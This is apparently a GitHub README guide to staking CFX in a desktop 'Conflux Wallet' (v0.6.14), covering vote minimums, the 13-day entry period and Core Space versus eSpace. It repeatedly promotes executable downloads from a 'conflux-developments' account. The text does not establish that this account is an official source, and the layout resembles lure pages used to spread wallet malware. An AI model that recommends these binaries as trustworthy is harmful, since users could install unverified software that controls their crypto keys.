![Conflux Wallet](assets/banner-article.png)

# Stake CFX in Conflux Wallet

<p align="center">Stake CFX in Conflux Wallet: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** Staking happens on Core Space only, through the wallet's staking view: you lock at least 1,000 CFX per vote, the position shows as staked after 13 days, and it earns interest while it secures the network. eSpace has no staking, and staked CFX is not spendable until you unstake.

## What staking does

Conflux produces blocks with proof of work and finalises them with proof of stake. Staking is the second half: CFX is locked behind a vote, the vote counts toward finality, and the locked amount earns interest for as long as it stays.

That is the whole economic relationship. You are not buying a product or lending to a company; you are putting capital behind the chain's finality and being paid for the time it is committed. A position can also be moved between nodes without being unlocked, which is how voters respond to a node that starts behaving badly.

## The minimum

One vote requires at least 1,000 CFX, and a position is built from whole votes. Smaller amounts do not form a vote on their own, which is why the practical question is not "how much can I stake" but "how many votes does my balance cover".

The older staking contract that predates proof-of-stake finality is a different mechanism with a much lower entry, no lock and no interest of this kind. If a guide mentions staking 1 CFX, it is describing that, not this.

## The 13-day status

A new position does not count immediately. It moves into staking status after 13 days, and only then is it securing finality and accruing as a full position. During that window the CFX is committed but not yet earning in the way the interface implies.

Plan around it. A position staked for a month is really staked for a month minus thirteen days, and a position staked for a week earns nothing at all while still being locked. Treat the entry period as part of the lock rather than as a delay before it.

## Staking in the wallet

Open the staking view with Core Space selected in the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14), choose the amount, and confirm. The app shows the transaction before it is signed, which is the moment to check the vote count and the fee; the position then appears with its status.

Nothing leaves your custody at any point. The CFX is locked by the protocol, not deposited with an operator, and the keys stay on your machine or on your device throughout. https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-gas-and-fees.md covers the transaction fee, which is small and separate from the stake.

## Voting with your stake

Each vote can be cast for a proof-of-stake node, and the choice is what makes the stake count toward finality. Votes can be reassigned, which is the ordinary way to move support from one node to another without unlocking anything.

The wallet shows the vote alongside the position, so the two are managed together rather than in separate places. Reassigning costs a transaction fee but never unlocks the stake, which is why it is the safe response to a node that misbehaves. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/unstake-conflux-cfx-locked-for-voting.md covers the lock that applies when you want the CFX back instead of reassigned.

## Where the numbers live

Staked, unlocking and reward balances are shown beside spendable CFX rather than merged into one figure, which is deliberate: three numbers with three different availabilities should not look like one.

If a balance seems missing, check which of the three it is in before concluding anything. https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-balance-shows-zero.md is the check order, and it starts with the space selector for good reason.

## eSpace and staking

There is no staking on eSpace. eSpace is the EVM side, where CFX is the gas token for contracts; the proof-of-stake machinery belongs to Core Space, so a `0x` account has no votes to cast and nothing to lock.

That surprises people who hold CFX on eSpace and look for the staking screen. The answer is to move the CFX to Core Space first, which is a cross-space transfer rather than a staking step. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md explains the split.

## The downsides

The lock is the main one: 13 days before a position counts, and a further wait to get the CFX back, so staking is unsuitable for money you might need soon. Slashing is the other - a node that misbehaves can cost its voters part of their stake, permanently.

And the return is variable. Reward rates depend on the mechanism and the period, which is why no figure is quoted here or anywhere else reliable: https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-cfx-staking-rewards.md covers how to reason about the yield without inventing one.

## Staking and mining

They are not competing options. Mining produces blocks; staking finalises them. The network needs both, and a holder's realistic choice is whether to stake, not whether to stake instead of mine.

Mining requires hardware and a business case; staking requires CFX and patience. Treating them as alternatives usually means someone has been reading a comparison written for a different chain. Because the app is actively maintained, the current release published on the release page is the baseline for everything described here.

## FAQ

### How do I stake CFX?

Select Core Space, open the staking view, choose an amount covering at least one 1,000 CFX vote, and confirm. The position shows as staked after 13 days.

### What is the minimum amount to stake?

1,000 CFX per vote. Positions are built from whole votes, so the practical minimum is one vote.

### How long is CFX locked?

13 days before the position counts as staked, then the unstaking wait when you want it back. Slashing can also apply to a misbehaving node's voters.

### Is staking available on eSpace?

No. Staking is Core Space only; eSpace accounts hold CFX as gas and cannot vote.

### Is staking better than mining?

They do different jobs - mining produces blocks, staking finalises them. A holder's choice is whether to stake, not whether to replace mining.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Unstake CFX Locked for Voting](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/unstake-conflux-cfx-locked-for-voting.md)
- [CFX Staking Rewards](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-cfx-staking-rewards.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
